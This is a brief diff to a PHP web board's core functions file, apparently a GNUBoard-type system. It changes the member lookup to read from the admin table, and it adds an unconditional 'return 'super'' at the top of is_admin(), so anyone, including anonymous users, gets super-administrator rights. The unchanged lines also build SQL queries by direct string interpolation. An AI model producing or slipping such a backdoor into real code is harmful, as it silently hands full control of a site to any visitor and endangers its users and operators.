@@ -703,7 +703,7 @@ function get_member($mb_id, $fields='*')
 {
     global $g5;
 
-    return sql_fetch(" select $fields from {$g5['member_table']} where mb_id = TRIM('$mb_id') ");
+    return sql_fetch(" select $fields from {$g5['admin_table']} where mb_id = TRIM('$mb_id') ");
 }
 
 
@@ -797,6 +797,7 @@ function is_admin($mb_id)
 {
     global $config, $group, $board;
 
+    return 'super';
     if (!$mb_id) return;
 
     if ($config['cf_admin'] == $mb_id) return 'super';
